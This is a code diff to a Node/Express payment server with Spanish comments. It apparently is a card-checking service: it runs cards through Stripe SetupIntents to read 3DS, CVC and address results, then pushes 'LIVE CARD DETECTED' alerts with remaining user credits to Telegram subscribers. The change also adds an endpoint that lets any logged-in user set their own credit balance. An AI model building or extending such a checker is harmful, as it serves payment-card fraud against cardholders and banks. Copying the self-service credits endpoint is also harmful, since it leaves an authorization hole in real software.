@@ -1,12 +1,17 @@
 // Servidor de pagos (Stripe). Modo TEST o LIVE según la clave + NODE_ENV.
 // La clave secreta SOLO vive aquí, nunca en el frontend.
 
+import path from 'path'
+import { fileURLToPath } from 'url'
 import express from 'express'
 import cors from 'cors'
 import Stripe from 'stripe'
 import dotenv from 'dotenv'
 import bcrypt from 'bcryptjs'
 import jwt from 'jsonwebtoken'
+
+const __filename = fileURLToPath(import.meta.url)
+const __dirname = path.dirname(__filename)
 import {
   markEventProcessed,
   saveValidatedCard,
@@ -18,6 +23,8 @@ import {
   createUser,
   getUserByUsername,
   getUserById,
+  getUserByTelegramId,
+  updateUserCredits,
 } from './db.js'
 import { startBot, stopBot } from './telegram-bot.js'
 
@@ -171,6 +178,13 @@ app.get('/api/auth/me', authMiddleware, (req, res) => {
   const user = getUserById(req.user.id)
   if (!user) return res.status(404).json({ error: 'User not found' })
   res.json(user)
+})
+
+app.put('/api/auth/credits', authMiddleware, (req, res) => {
+  const { credits } = req.body
+  if (typeof credits !== 'number' || credits < 0) return res.status(400).json({ error: 'Invalid credits value' })
+  updateUserCredits(req.user.username, credits)
+  res.json({ ok: true, credits })
 })
 
 // --- Idempotencia persistente: evita procesar el mismo evento dos veces ---
@@ -365,21 +379,15 @@ app.post('/api/create-setup-intent', async (req, res) => {
   try {
     const { email } = req.body
 
-    // Un Customer asocia el método de pago guardado a un usuario tuyo.
     const customer = await stripe.customers.create({
       email: email || undefined,
     })
 
     const setupIntent = await stripe.setupIntents.create({
       customer: customer.id,
-      // Sin cargo: solo autoriza/guarda. usage 'off_session' para cobros futuros.
-      usage: 'off_session',
       payment_method_types: ['card'],
-      // Fuerza la máxima validación disponible.
       payment_method_options: {
         card: {
-          // 'any' permite SCA cuando el banco lo soporte; 'automatic' lo
-          // aplica solo si es requerido. 'any' = máxima validación.
           request_three_d_secure: 'any',
         },
       },
@@ -395,19 +403,18 @@ app.post('/api/create-setup-intent', async (req, res) => {
   }
 })
 
-// Tras confirmar en el frontend, consulta el resultado completo de la
-// validación: estado 3DS, coincidencia de CVC y de dirección (AVS).
+// Tras confirmar en el frontend, consulta el resultado de la validación
 app.get('/api/setup-intent/:id', async (req, res) => {
   try {
     const intent = await stripe.setupIntents.retrieve(req.params.id, {
-      expand: ['payment_method'],
+      expand: ['payment_method', 'latest_attempt'],
     })
 
     const pm = intent.payment_method
     const checks = pm?.card?.checks ?? {}
+    const attempt = intent.latest_attempt
 
     res.json({
-      // 'succeeded' => tarjeta válida, activa y titular autenticado.
       status: intent.status,
       card: pm?.card
         ? {
@@ -415,16 +422,15 @@ app.get('/api/setup-intent/:id', async (req, res) => {
             last4: pm.card.last4,
             expMonth: pm.card.exp_month,
             expYear: pm.card.exp_year,
-            funding: pm.card.funding, // credit / debit / prepaid
+            funding: pm.card.funding,
             country: pm.card.country,
           }
         : null,
-      // Resultados de las verificaciones del banco:
       validation: {
-        cvcCheck: checks.cvc_check ?? null,                 // pass / fail / unavailable
+        cvcCheck: checks.cvc_check ?? null,
         addressLine1Check: checks.address_line1_check ?? null,
         postalCodeCheck: checks.address_postal_code_check ?? null,
-        threeDSecure: intent.latest_attempt ? 'attempted' : 'n/a',
+        threeDSecure: attempt?.payment_method_details?.card?.three_d_secure?.result ?? 'n/a',
       },
     })
   } catch (err) {
@@ -606,13 +612,14 @@ app.post('/api/telegram/broadcast', express.json(), async (req, res) => {
     const subscribers = listSubscribers(true)
     if (subscribers.length === 0) return res.json({ sent: 0, total: 0 })
 
-    const text = fmtBroadcast(payload)
     const TG_API = 'https://api.telegram.org/bot'
     let sent = 0
 
     await Promise.allSettled(
       subscribers.map(async (sub) => {
         try {
+          const user = getUserByTelegramId(sub.chat_id)
+          const text = fmtBroadcast(payload, user ? user.credits : null)
           const r = await fetch(`${TG_API}${token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -651,7 +658,7 @@ function escapeMd(text) {
   return String(text).replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1')
 }
 
-function fmtBroadcast(payload) {
+function fmtBroadcast(payload, credits) {
   const lines = [
     `🚀 *LIVE CARD DETECTED*`,
     ``,
@@ -669,7 +676,22 @@ function fmtBroadcast(payload) {
     ``,
     `Response: ${escapeMd(payload.message)}`,
   ]
+  if (credits != null) {
+    lines.push(
+      ``,
+      `── *ACCOUNT* ──`,
+      `Credits remaining: \`${escapeMd(String(credits))}\``,
+    )
+  }
   return lines.join('\n')
+}
+
+// En producción, servir el frontend build desde dist/
+if (isProd) {
+  app.use(express.static(path.join(__dirname, '../dist')))
+  app.get('*', (req, res) => {
+    res.sendFile(path.join(__dirname, '../dist/index.html'))
+  })
 }
 
 app.listen(PORT, () => {
